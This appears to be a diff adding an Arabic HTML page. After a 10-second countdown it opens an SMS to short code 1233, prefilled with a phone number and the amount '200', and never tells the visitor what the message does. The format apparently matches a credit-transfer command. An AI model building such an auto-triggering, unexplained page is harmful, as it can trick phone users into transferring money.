@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحويل إلى الرسائل</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f4;
+            font-family: Arial, sans-serif;
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 16px;
+            color: #fff;
+            background-color: #007bff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        p {
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <p>سيتم إرسال الرسالة تلقائيًا بعد <span id="timer">10</span> ثوانٍ...</p>
+    <button onclick="sendMessage()">اضغط هنا لإرسال الرسالة الآن</button>
+
+    <script>
+        const number = "1233"; // رقم الهاتف
+        const message = "0995039296 200"; // محتوى الرسالة
+        const delay = 10; // عدد الثواني قبل الإرسال التلقائي
+
+        // وظيفة إرسال الرسالة
+        function sendMessage() {
+            window.location.href = `sms:${number}?body=${encodeURIComponent(message)}`;
+        }
+
+        // عداد زمني للإرسال التلقائي
+        let timeLeft = delay;
+        const timerElement = document.getElementById("timer");
+
+        const countdown = setInterval(() => {
+            timeLeft--;
+            timerElement.textContent = timeLeft;
+
+            // إذا انتهى الوقت، يتم الإرسال تلقائيًا
+            if (timeLeft <= 0) {
+                clearInterval(countdown); // إيقاف العداد
+                sendMessage(); // إرسال الرسالة تلقائيًا
+            }
+        }, 1000); // تحديث كل ثانية
+    </script>
+</body>
+</html>
